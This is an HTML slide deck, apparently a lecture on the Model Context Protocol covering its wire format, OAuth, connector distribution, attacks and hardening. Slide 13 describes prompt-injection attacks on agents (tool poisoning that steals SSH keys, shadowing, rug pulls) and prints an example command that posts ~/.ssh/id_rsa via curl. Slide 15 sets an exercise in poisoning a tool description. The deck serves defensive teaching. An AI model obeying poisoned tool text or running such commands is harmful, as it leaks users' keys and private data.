@@ -1,0 +1,464 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>LLM AgentOS — MCP, Plugins and Connectors</title>
+<style>
+  :root {
+    --bg: #0f1420; --panel: #161d2e; --ink: #e8ecf4; --muted: #9aa6bd; --line: #2a3550;
+    --accent: #6ea8ff; --accent2: #7be0b8; --warn: #ffb86b; --bad: #ff7a85;
+    --mono: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+    --sans: Inter, system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+  }
+  * { box-sizing: border-box; }
+  html, body { margin: 0; height: 100%; background: #05070c; color: var(--ink); font-family: var(--sans); overflow: hidden; }
+  #stage { position: absolute; left: 50%; top: 50%; width: 1280px; height: 720px; transform-origin: center; }
+  .slide { position: absolute; inset: 0; background: var(--bg); padding: 56px 72px 64px; display: none; flex-direction: column; }
+  .slide.active { display: flex; }
+  h1 { font-size: 54px; margin: 0 0 16px; letter-spacing: -0.02em; }
+  h2 { font-size: 36px; margin: 0 0 24px; letter-spacing: -0.01em; }
+  h2 small { display: block; font-size: 16px; color: var(--accent); font-weight: 600; text-transform: uppercase; letter-spacing: .08em; margin-bottom: 8px; }
+  p, li { font-size: 22px; line-height: 1.45; color: var(--ink); }
+  li { margin: 6px 0; }
+  ul { margin: 0; padding-left: 26px; }
+  .muted { color: var(--muted); }
+  .accent { color: var(--accent); } .accent2 { color: var(--accent2); } .warn { color: var(--warn); }
+  code, pre { font-family: var(--mono); }
+  code { background: #1f2840; padding: 1px 6px; border-radius: 4px; font-size: .9em; }
+  pre { background: #0a0e18; border: 1px solid var(--line); border-radius: 10px; padding: 16px 18px; font-size: 16px; line-height: 1.5; margin: 0; overflow: hidden; }
+  .cols { display: grid; grid-template-columns: 1fr 1fr; gap: 32px; flex: 1; }
+  .cols3 { display: grid; grid-template-columns: repeat(3, 1fr); gap: 20px; }
+  .card { background: var(--panel); border: 1px solid var(--line); border-radius: 12px; padding: 18px 20px; }
+  .card h3 { margin: 0 0 8px; font-size: 21px; color: var(--accent2); }
+  .card p, .card li { font-size: 18px; }
+  table { border-collapse: collapse; width: 100%; font-size: 18px; }
+  th, td { border-bottom: 1px solid var(--line); padding: 9px 10px; text-align: left; vertical-align: top; }
+  th { color: var(--accent); font-weight: 600; }
+  table.dense th, table.dense td { font-size: 15px; padding: 7px 8px; line-height: 1.35; }
+  table.dense td:first-child { color: var(--accent2); white-space: nowrap; }
+  .cite { position: absolute; left: 72px; bottom: 22px; font-size: 13px; color: var(--muted); max-width: 1000px; }
+  .num { position: absolute; right: 32px; bottom: 22px; font-size: 13px; color: var(--muted); }
+  .title-slide { justify-content: center; background: radial-gradient(1200px 600px at 80% 20%, #1c2a4d 0%, var(--bg) 60%); }
+  .pill { display: inline-block; padding: 4px 12px; border: 1px solid var(--line); border-radius: 999px; font-size: 15px; color: var(--muted); margin-right: 8px; }
+  svg text { font-family: var(--sans); }
+  svg text:not([fill]) { fill: var(--ink); }
+  ul[style] > li, ol[style] > li { font-size: inherit; }
+  #hint { position: fixed; top: 6px; left: 50%; transform: translateX(-50%); font-size: 12px; color: #556; font-family: var(--sans); }
+  @media print {
+    html, body { overflow: visible; background: none; }
+    #stage { position: static; transform: none !important; }
+    .slide { display: flex !important; position: relative; page-break-after: always; }
+    #hint { display: none; }
+  }
+</style>
+</head>
+<body>
+<div id="stage">
+<!-- 1 -->
+<section class="slide title-slide">
+  <div class="pill">LLM AgentOS · Module 5 lecture · Tools and extensions</div>
+  <h1 style="margin-top:22px">MCP, plugins and connectors</h1>
+  <p class="muted" style="font-size:26px;max-width:1000px">The device-driver bus of the AgentOS: what the Model Context Protocol carries, how the
+    stateless 2026-07-28 version works on the wire, how remote servers are authorized,
+    how connectors are distributed, and how MCP servers get attacked and defended.</p>
+  <p style="margin-top:28px"><span class="pill">Primitives</span><span class="pill">Stateless core</span><span class="pill">Transports</span><span class="pill">OAuth</span><span class="pill">Registries</span><span class="pill">Tool poisoning</span></p>
+</section>
+
+<!-- 2 -->
+<section class="slide">
+  <h2><small>OS analogy</small>MCP is a driver bus; a connector is a driver you can install</h2>
+  <div class="cols">
+    <table class="dense">
+      <tr><th>Classic OS</th><th>AgentOS with MCP</th></tr>
+      <tr><td>Bus standard (USB, PCIe)</td><td>MCP: JSON-RPC 2.0 messages and capabilities</td></tr>
+      <tr><td>Device driver</td><td>MCP server (local process or remote service)</td></tr>
+      <tr><td>Kernel driver manager</td><td>MCP client inside the host (harness)</td></tr>
+      <tr><td>Driver catalog / app store</td><td>MCP Registry, connector directories</td></tr>
+      <tr><td>Driver signing</td><td>Namespace verification, review, pinning</td></tr>
+    </table>
+    <div class="card">
+      <h3>Who controls each primitive</h3>
+      <ul>
+        <li><b>Tools</b>: model-controlled actions (<code>tools/list</code>, <code>tools/call</code>).</li>
+        <li><b>Resources</b>: application-controlled data by URI (<code>resources/read</code>).</li>
+        <li><b>Prompts</b>: user-controlled templates, often slash commands (<code>prompts/get</code>).</li>
+        <li>Server → user: <b>elicitation</b> (form or URL). Sampling, roots and logging are deprecated since 2026-07-28.</li>
+      </ul>
+    </div>
+  </div>
+  <div class="cite">modelcontextprotocol.io/specification/2026-07-28 (server features: tools, resources, prompts); changelog SEP-2577 (deprecations).</div>
+</section>
+
+<!-- 3 -->
+<section class="slide">
+  <h2><small>What changed</small>2026-07-28: MCP becomes stateless</h2>
+  <table class="dense">
+    <tr><th></th><th>2025-11-25 and earlier</th><th>2026-07-28</th></tr>
+    <tr><td>Start of a conversation</td><td><code>initialize</code> → <code>notifications/initialized</code></td><td>None. Optional <code>server/discover</code> (servers MUST implement it)</td></tr>
+    <tr><td>Version and capabilities</td><td>Negotiated once per connection</td><td>Sent on every request in <code>_meta</code> (<code>io.modelcontextprotocol/protocolVersion</code>, <code>…/clientCapabilities</code>)</td></tr>
+    <tr><td>Session</td><td><code>Mcp-Session-Id</code> header</td><td>Removed; state lives in explicit handles passed as tool arguments</td></tr>
+    <tr><td>Server asks client</td><td>Server-initiated <code>elicitation/create</code>, <code>sampling/createMessage</code></td><td>Multi round-trip requests: result <code>resultType: "input_required"</code>, client retries</td></tr>
+    <tr><td>Change notifications</td><td>HTTP GET stream, <code>resources/subscribe</code></td><td>One <code>subscriptions/listen</code> stream, opt in per type</td></tr>
+    <tr><td>Long-running work</td><td>Experimental tasks in core</td><td><code>io.modelcontextprotocol/tasks</code> extension (<code>tasks/get</code>, <code>tasks/update</code>)</td></tr>
+  </table>
+  <p style="font-size:18px;margin-top:14px">Why it matters for operators: any request can hit any replica behind a round-robin load balancer, with no sticky sessions or shared session store. Deprecated features keep working for at least 12 months.</p>
+  <div class="cite">MCP 2026-07-28 changelog (SEP-2567, SEP-2575, SEP-2322, SEP-2663, SEP-2596): modelcontextprotocol.io/specification/2026-07-28/changelog; blog.modelcontextprotocol.io/posts/2026-07-28.</div>
+</section>
+
+<!-- 4 -->
+<section class="slide">
+  <h2><small>On the wire</small>One self-contained tool call over Streamable HTTP</h2>
+  <div class="cols">
+<pre style="font-size:13px">POST /mcp HTTP/1.1
+MCP-Protocol-Version: 2026-07-28
+Mcp-Method: tools/call
+Mcp-Name: search
+Authorization: Bearer eyJ...
+Content-Type: application/json
+
+{"jsonrpc": "2.0", "id": 7,
+ "method": "tools/call",
+ "params": {
+   "name": "search",
+   "arguments": {"q": "kv cache"},
+   "_meta": {
+     "io.modelcontextprotocol/protocolVersion": "2026-07-28",
+     "io.modelcontextprotocol/clientInfo": {...},
+     "io.modelcontextprotocol/clientCapabilities": {...}}}}
+
+→ {"result": {"resultType": "complete",
+     "content": [...], "isError": false}}</pre>
+    <div class="card">
+      <h3>Read it like a sysadmin</h3>
+      <ul>
+        <li><code>Mcp-Method</code> and <code>Mcp-Name</code> are required on POST, so gateways and WAFs can route, rate-limit and meter without parsing the body (SEP-2243).</li>
+        <li>A tool can mirror a primitive argument into an <code>Mcp-Param-*</code> header with <code>x-mcp-header</code>; never mark secrets this way.</li>
+        <li>Every result has <code>resultType</code>; results from older servers without it count as <code>"complete"</code>.</li>
+        <li>Wrong version → <code>UnsupportedProtocolVersionError</code>.</li>
+        <li>Trace context rides in <code>_meta</code> (<code>traceparent</code>), which ties into the observability deck.</li>
+      </ul>
+    </div>
+  </div>
+  <div class="cite">modelcontextprotocol.io/specification/2026-07-28/server/tools; …/basic/transports/streamable-http; changelog minor changes 2 and 4.</div>
+</section>
+
+<!-- 5 -->
+<section class="slide">
+  <h2><small>Transports</small>stdio for local drivers, Streamable HTTP for remote ones</h2>
+  <div class="cols">
+    <div class="card">
+      <h3>stdio</h3>
+      <ul>
+        <li>The client launches the server as a child process; newline-delimited JSON-RPC on stdin/stdout.</li>
+        <li><code>stderr</code> is for logs (the replacement for the deprecated Logging feature).</li>
+        <li>No OAuth: credentials come from the environment, so the harness decides which env vars the child sees.</li>
+        <li>Runs with the user's privileges unless the harness sandboxes it.</li>
+      </ul>
+    </div>
+    <div class="card">
+      <h3>Streamable HTTP</h3>
+      <ul>
+        <li>One endpoint; the response is plain JSON or an SSE stream for progress.</li>
+        <li>No resumability since 2026-07-28: a broken stream loses the request, so the client re-issues it with a new id.</li>
+        <li>Validate <code>Origin</code> (DNS rebinding), bind local servers to localhost, authenticate every request.</li>
+        <li>The old HTTP+SSE transport (2024-11-05) is formally Deprecated.</li>
+      </ul>
+    </div>
+  </div>
+  <p style="font-size:18px;margin-top:14px">Rule of thumb: stdio when the driver needs the local machine (files, IDE, VPN); HTTP when many users share one service and you want central updates and OAuth.</p>
+  <div class="cite">modelcontextprotocol.io/specification/2026-07-28/basic/transports; changelog major change 9 and deprecation 2.</div>
+</section>
+
+<!-- 6 -->
+<section class="slide">
+  <h2><small>Asking the user</small>Multi round-trip requests replace server-initiated calls</h2>
+  <div class="cols">
+<pre style="font-size:13px">// 1. client → tools/call {"name": "deploy", ...}
+// 2. server answers with an interim result
+{"resultType": "input_required",
+ "inputRequests": {
+   "confirm": {"method": "elicitation/create",
+     "params": {"mode": "form",
+       "message": "Deploy to prod?",
+       "requestedSchema": {...}}}},
+ "requestState": "eyJ..."}
+
+// 3. client asks the user, then retries
+//    with a NEW JSON-RPC id
+{"method": "tools/call",
+ "params": {"name": "deploy", ...,
+   "inputResponses": {
+     "confirm": {"action": "accept",
+                 "content": {...}}},
+   "requestState": "eyJ..."}}</pre>
+    <div class="card">
+      <h3>Design consequences</h3>
+      <ul>
+        <li>No held-open stream is needed for the server to ask a question; any replica can handle the retry.</li>
+        <li><code>requestState</code> is opaque server state carried by the client; treat it like a cookie (sign or encrypt it).</li>
+        <li>URL-mode elicitation sends the user to a browser page (OAuth, payments) so secrets never pass through the model.</li>
+        <li>Kernel view: this is a syscall that returns <code>EAGAIN</code> with a continuation, not an upcall into user space.</li>
+      </ul>
+    </div>
+  </div>
+  <div class="cite">modelcontextprotocol.io/specification/2026-07-28/basic/patterns/mrtr; changelog SEP-2322 and minor change 11.</div>
+</section>
+
+<!-- 7 -->
+<section class="slide">
+  <h2><small>Context plane</small>Resources, prompts and cacheable lists</h2>
+  <div class="cols">
+    <div class="card">
+      <h3>Resources and prompts</h3>
+      <ul>
+        <li>Resources are URI-addressed data (<code>file://</code>, <code>git://</code>, custom schemes); the host decides what enters context.</li>
+        <li>Tools can return a <code>resource_link</code> instead of inlining a large blob: a pointer, like an mmap.</li>
+        <li>Prompts are user-picked templates; the host renders them as slash commands.</li>
+        <li>Stateful servers return explicit handles (e.g., <code>basket_id</code>) and check authorization on every call.</li>
+      </ul>
+    </div>
+    <div class="card">
+      <h3>Caching (SEP-2549)</h3>
+      <ul>
+        <li><code>tools/list</code>, <code>prompts/list</code>, <code>resources/list</code>, <code>resources/read</code> carry <code>ttlMs</code> and <code>cacheScope</code> (<code>public</code> / <code>private</code>).</li>
+        <li>Servers SHOULD return tools in a deterministic order.</li>
+        <li>Why: tool definitions sit at the front of the prompt. A stable, ordered tool list keeps the provider's prompt cache (and your KV cache) warm.</li>
+      </ul>
+    </div>
+  </div>
+  <div class="cite">modelcontextprotocol.io/specification/2026-07-28/server/resources, …/server/prompts, …/server/utilities/caching; see the KV-cache deck for prefix caching.</div>
+</section>
+
+<!-- 8 -->
+<section class="slide">
+  <h2><small>Authorization</small>A remote MCP server is an OAuth 2.1 resource server</h2>
+  <div class="cols">
+    <ol style="font-size:17px;padding-left:24px">
+      <li>Client calls without a token → <b>401</b> with <code>WWW-Authenticate: Bearer resource_metadata="…"</code>, often with a <code>scope</code>.</li>
+      <li>Client reads Protected Resource Metadata (<b>RFC 9728</b>) to find the authorization server.</li>
+      <li>Client reads AS metadata (RFC 8414 or OpenID Connect Discovery; clients MUST support both).</li>
+      <li>Client gets a client ID: <b>Client ID Metadata Document</b> (an HTTPS URL as <code>client_id</code>), pre-registration, or Dynamic Client Registration (now deprecated).</li>
+      <li>Authorization code + <b>PKCE</b>, with <code>resource=&lt;canonical server URI&gt;</code> (<b>RFC 8707</b>) on both requests.</li>
+      <li>Client checks <code>iss</code> in the response against the recorded issuer (<b>RFC 9207</b>) before redeeming the code.</li>
+      <li>Every request carries <code>Authorization: Bearer</code>; the server checks the token's audience is itself.</li>
+    </ol>
+    <div class="card">
+      <h3>Rules students get wrong</h3>
+      <ul>
+        <li>stdio servers SHOULD NOT use this flow; they read credentials from the environment.</li>
+        <li>Tokens never go in the query string.</li>
+        <li>Credentials are bound to the issuer that issued them; re-register when it changes (SEP-2352).</li>
+        <li>Desktop and CLI clients declare <code>application_type</code> so localhost redirects work (SEP-837).</li>
+      </ul>
+    </div>
+  </div>
+  <div class="cite">modelcontextprotocol.io/specification/2026-07-28/basic/authorization.</div>
+</section>
+
+<!-- 9 -->
+<section class="slide">
+  <h2><small>Least privilege</small>Scopes, step-up, and two forbidden patterns</h2>
+  <div class="cols">
+    <div class="card">
+      <h3>Progressive scopes</h3>
+      <ul>
+        <li>Start with a minimal scope set; <code>scopes_supported</code> is meant to be the minimum, not the catalog.</li>
+        <li>On a privileged call the server answers <b>403</b> <code>error="insufficient_scope", scope="files:write"</code>, all needed scopes in one challenge.</li>
+        <li>The client re-authorizes with the <b>union</b> of old and new scopes, retries a few times at most, then gives up.</li>
+        <li>Avoid wildcard scopes (<code>*</code>, <code>full-access</code>).</li>
+      </ul>
+    </div>
+    <div class="card">
+      <h3>Never</h3>
+      <ul>
+        <li><b>Token passthrough</b>: a server MUST NOT accept tokens not issued for it, nor forward the client's token downstream. It breaks audit, rate limits and audience checks.</li>
+        <li><b>Confused deputy</b>: a proxy with a static upstream client ID plus DCR plus a consent cookie lets an attacker skip consent. Proxies MUST keep per-client consent, exact <code>redirect_uri</code> match and single-use <code>state</code>.</li>
+      </ul>
+    </div>
+  </div>
+  <div class="cite">MCP authorization (scope challenge handling) and Security Best Practices: modelcontextprotocol.io/specification/2025-11-25/basic/security_best_practices.</div>
+</section>
+
+<!-- 10 -->
+<section class="slide">
+  <h2><small>Distribution</small>From a server to a connector people can install</h2>
+  <table class="dense">
+    <tr><th>Channel</th><th>What it is</th><th>Trust signal</th></tr>
+    <tr><td>MCP Registry (preview)</td><td>Official metadata catalog (<code>server.json</code>): name, package or remote URL, env vars. Meant for aggregators, not hosts directly.</td><td>Namespace proof: <code>io.github.user/…</code> via GitHub, <code>com.example/…</code> via DNS or HTTP. Code scanning is left to npm / PyPI and aggregators.</td></tr>
+    <tr><td>Claude Connectors Directory</td><td>One catalog of MCP servers for claude.ai, Desktop, mobile, Claude Code and Cowork; admins enable per org.</td><td>Verified vs. community labels; verification is not a security audit.</td></tr>
+    <tr><td>MCP Bundles (<code>.mcpb</code>)</td><td>Zip of a local stdio server plus <code>manifest.json</code>; one-click install in Claude Desktop.</td><td>Install UI shows permissions; <code>user_config</code> for secrets; org allowlists.</td></tr>
+    <tr><td>Harness plugins</td><td>Claude Code / Hermes / OpenClaw plugins that ship MCP servers with skills and hooks.</td><td>Marketplace review, install scans (see extension layer deck).</td></tr>
+    <tr><td>MCP Apps (extension)</td><td>Server-rendered UI: <code>ui://</code> HTML templates, linked from a tool by <code>_meta</code>, shown in a sandboxed iframe.</td><td>Pre-declared templates, postMessage JSON-RPC that can be logged, consent for UI-initiated tool calls.</td></tr>
+  </table>
+  <div class="cite">modelcontextprotocol.io/registry/about; claude.com/docs/connectors/directory; claude.com/docs/connectors/building/mcpb; blog.modelcontextprotocol.io/posts/2025-11-21-mcp-apps (SEP-1865).</div>
+</section>
+
+<!-- 11 -->
+<section class="slide">
+  <h2><small>Mounting drivers</small>How three harnesses configure MCP servers</h2>
+  <table class="dense">
+    <tr><th></th><th>Hermes Agent</th><th>OpenClaw</th><th>Codex</th></tr>
+    <tr><td>Where</td><td><code>~/.hermes/config.yaml</code> → <code>mcp_servers</code></td><td>Gateway config → <code>mcp.servers</code></td><td><code>~/.codex/config.toml</code> → <code>[mcp_servers.&lt;name&gt;]</code></td></tr>
+    <tr><td>stdio / HTTP</td><td><code>command</code>, <code>args</code>, <code>env</code> / <code>url</code>, <code>headers</code></td><td><code>command</code>, <code>args</code>, <code>cwd</code> / <code>url</code>, <code>transport</code></td><td><code>command</code>, <code>args</code>, <code>env</code> / <code>url</code>, <code>bearer_token_env_var</code></td></tr>
+    <tr><td>Tool filter</td><td><code>tools.include</code> / <code>tools.exclude</code> (globs; include wins)</td><td><code>toolFilter.include</code> / <code>exclude</code></td><td><code>enabled_tools</code>, then <code>disabled_tools</code></td></tr>
+    <tr><td>OAuth</td><td><code>auth: oauth</code>; <code>hermes mcp login</code></td><td><code>auth: "oauth"</code> + metadata</td><td><code>codex mcp login &lt;name&gt;</code></td></tr>
+    <tr><td>Safety notes</td><td>Tools named <code>mcp_&lt;server&gt;_&lt;tool&gt;</code>; stdio child gets only its env + a safe baseline</td><td>Same tool profiles and policy as native tools; <code>openclaw mcp doctor --probe</code></td><td><code>required = true</code> fails startup if a server is down; timeouts 10 s / 60 s</td></tr>
+  </table>
+  <div class="cite">hermes-agent.nousresearch.com/docs/user-guide/features/mcp; docs.openclaw.ai/tools/mcp; learn.chatgpt.com/docs/extend/mcp (Codex).</div>
+</section>
+
+<!-- 12 -->
+<section class="slide">
+  <h2><small>Choosing a mechanism</small>MCP server, in-process plugin or skill?</h2>
+  <table class="dense">
+    <tr><th></th><th>MCP server</th><th>In-process plugin</th><th>Skill</th></tr>
+    <tr><td>Adds</td><td>Tools, resources, prompts</td><td>Hooks, slots, tools, prompt edits</td><td>Instructions + scripts loaded on demand</td></tr>
+    <tr><td>Runs in</td><td>Own process or remote service</td><td>The harness process</td><td>The model's context (scripts in the sandbox)</td></tr>
+    <tr><td>Portable to</td><td>Any MCP host</td><td>One harness</td><td>Any host that reads <code>SKILL.md</code></td></tr>
+    <tr><td>Context cost</td><td>Every tool definition, every turn (unless tool search)</td><td>Whatever it injects</td><td>About 100 tokens until used</td></tr>
+    <tr><td>Can enforce policy?</td><td>Only on its own tools</td><td>Yes (hooks see every call)</td><td>No (advice to the model)</td></tr>
+  </table>
+  <p style="font-size:18px;margin-top:14px">Common pattern: an MCP server for access to a system, a skill that teaches how to use it well, and a plugin hook that enforces the rules no prompt can.</p>
+  <div class="cite">Extension layer deck (plugins vs. MCP); Skills deck (progressive disclosure); Tools and sandbox deck (tool search, code execution with MCP).</div>
+</section>
+
+<!-- 13 -->
+<section class="slide">
+  <h2><small>Threats</small>How MCP servers get attacked</h2>
+  <div class="cols">
+    <div class="card">
+      <h3>Through the model</h3>
+      <ul>
+        <li><b>Tool poisoning</b> (Invariant Labs, Apr 2025): hidden instructions in a tool description made Cursor read <code>~/.cursor/mcp.json</code> and SSH keys and pass them in a parameter.</li>
+        <li><b>Shadowing</b>: one server's description rewires a trusted server's tool (all emails go to the attacker).</li>
+        <li><b>Rug pull</b>: the description changes after the user approved it.</li>
+        <li><b>Toxic agent flow</b> (May 2025): a public GitHub issue made an agent copy private-repo data into a public PR. No server bug to patch.</li>
+        <li><b>MCPTox</b> (2508.14925): 45 real servers, 353 tools, 20 agents; up to 72.8% attack success, refusals under 3%. More capable models were often more susceptible.</li>
+      </ul>
+    </div>
+    <div class="card">
+      <h3>Around the model</h3>
+      <ul>
+        <li><b>Local server compromise</b>: a one-click config that runs <code>npx evil &amp;&amp; curl -d @~/.ssh/id_rsa …</code>.</li>
+        <li><b>SSRF</b>: a malicious server points OAuth metadata at <code>169.254.169.254</code> or localhost.</li>
+        <li><b>Authorization URL injection</b>: <code>javascript:</code> URLs, or URLs opened through a shell.</li>
+        <li><b>Session hijack</b> (older stateful servers): guessed session IDs inject events.</li>
+      </ul>
+    </div>
+  </div>
+  <div class="cite">invariantlabs.ai/blog/mcp-security-notification; invariantlabs.ai/blog/mcp-github-vulnerability; arxiv.org/abs/2508.14925; MCP Security Best Practices.</div>
+</section>
+
+<!-- 14 -->
+<section class="slide">
+  <h2><small>Defenses</small>A hardening checklist for an MCP-enabled harness</h2>
+  <div class="cols">
+    <div class="card">
+      <h3>Client / host</h3>
+      <ul>
+        <li>Show the exact command before adding a local server; run it sandboxed with a filtered env.</li>
+        <li>Allowlist servers and tools (<code>include</code> / <code>enabled_tools</code>); prefix names by server.</li>
+        <li>Pin versions and hash tool descriptions; re-prompt when a description changes.</li>
+        <li>Treat annotations and tool output as untrusted; apply the access control deck's Rule of Two.</li>
+        <li>Block private IP ranges and non-HTTPS URLs during OAuth discovery; open URLs without a shell.</li>
+      </ul>
+    </div>
+    <div class="card">
+      <h3>Server</h3>
+      <ul>
+        <li>Validate audience; never pass tokens through.</li>
+        <li>Minimal scopes with step-up; log elevations.</li>
+        <li>Validate <code>Origin</code>; bind local HTTP to localhost or use stdio.</li>
+        <li>Validate inputs, rate-limit, sanitize outputs; return <code>isError</code> results the model can act on.</li>
+        <li>Opaque, high-entropy handles; authorize on every call.</li>
+      </ul>
+    </div>
+  </div>
+  <div class="cite">MCP Security Best Practices; MCP 2026-07-28 Tools (security considerations); Meta "Agents Rule of Two" (see the access control deck).</div>
+</section>
+
+<!-- 15 -->
+<section class="slide">
+  <h2><small>Exercise</small>Build, mount, attack and harden one MCP server</h2>
+  <div class="cols">
+    <div>
+      <ol style="font-size:19px;padding-left:24px">
+        <li>Write a small server with two tools (<code>search_notes</code>, <code>send_note</code>) with an SDK that speaks 2026-07-28; serve it over stdio and Streamable HTTP.</li>
+        <li>Mount it in two harnesses (Hermes <code>mcp_servers</code>, Codex <code>[mcp_servers]</code>) with a tool filter.</li>
+        <li>Make <code>send_note</code> ask for confirmation through an <code>input_required</code> result.</li>
+        <li>Add a poisoned description to a second server and see if the agent leaks a note.</li>
+        <li>Turn on one defense at a time and measure again.</li>
+      </ol>
+    </div>
+    <div class="card">
+      <h3>Report</h3>
+      <ul>
+        <li>Context tokens spent on tool definitions</li>
+        <li>Requests per call over HTTP (with and without <code>server/discover</code>)</li>
+        <li>Attack success with each defense</li>
+        <li>Which defense lived in the server, the host, or a hook</li>
+      </ul>
+    </div>
+  </div>
+</section>
+
+<!-- 16 -->
+<section class="slide">
+  <h2><small>References</small>Read next</h2>
+  <div class="cols">
+    <ul style="font-size:15px">
+      <li>MCP 2026-07-28 changelog: modelcontextprotocol.io/specification/2026-07-28/changelog</li>
+      <li>Release post: blog.modelcontextprotocol.io/posts/2026-07-28</li>
+      <li>Authorization: modelcontextprotocol.io/specification/2026-07-28/basic/authorization</li>
+      <li>Tools: modelcontextprotocol.io/specification/2026-07-28/server/tools</li>
+      <li>Security Best Practices: modelcontextprotocol.io/specification/2025-11-25/basic/security_best_practices</li>
+      <li>MCP Registry: modelcontextprotocol.io/registry/about</li>
+      <li>MCP Apps (SEP-1865): blog.modelcontextprotocol.io/posts/2025-11-21-mcp-apps</li>
+    </ul>
+    <ul style="font-size:15px">
+      <li>Claude Connectors Directory: claude.com/docs/connectors/directory</li>
+      <li>MCP Bundles: claude.com/docs/connectors/building/mcpb</li>
+      <li>Hermes MCP: hermes-agent.nousresearch.com/docs/user-guide/features/mcp</li>
+      <li>OpenClaw MCP: docs.openclaw.ai/tools/mcp · Codex MCP: learn.chatgpt.com/docs/extend/mcp</li>
+      <li>Invariant Labs, tool poisoning (Apr 2025) and GitHub MCP exploit (May 2025)</li>
+      <li>MCPTox (AAAI 2026): arxiv.org/abs/2508.14925</li>
+      <li>All links: <code>references/bibliography_and_links.md</code> §5b</li>
+    </ul>
+  </div>
+</section>
+</div>
+<div id="hint">← / → to navigate · F for full screen</div>
+<script>
+(function () {
+  const slides = Array.from(document.querySelectorAll('.slide'));
+  const offset = 0; // first slide number in this file
+  slides.forEach((s, i) => {
+    const n = document.createElement('div');
+    n.className = 'num'; n.textContent = (i + 1 + offset) + ' / ' + (slides.length + offset);
+    s.appendChild(n);
+  });
+  let cur = Math.min(Math.max(parseInt(location.hash.slice(1), 10) - 1 - offset || 0, 0), slides.length - 1);
+  function show(i) {
+    cur = Math.min(Math.max(i, 0), slides.length - 1);
+    slides.forEach((s, j) => s.classList.toggle('active', j === cur));
+    history.replaceState(null, '', '#' + (cur + 1 + offset));
+  }
+  function fit() {
+    const k = Math.min(innerWidth / 1280, innerHeight / 720);
+    document.getElementById('stage').style.transform = 'translate(-50%, -50%) scale(' + k + ')';
+  }
+  addEventListener('keydown', e => {
+    if (['ArrowRight', 'PageDown', ' '].includes(e.key)) show(cur + 1);
+    if (['ArrowLeft', 'PageUp'].includes(e.key)) show(cur - 1);
+    if (e.key === 'Home') show(0);
+    if (e.key === 'End') show(slides.length - 1);
+    if (e.key === 'f' || e.key === 'F') document.fullscreenElement ? document.exitFullscreen() : document.documentElement.requestFullscreen();
+  });
+  addEventListener('click', e => show(cur + (e.clientX > innerWidth / 2 ? 1 : -1)));
+  addEventListener('resize', fit);
+  fit(); show(cur);
+})();
+</script>
+</body>
+</html>
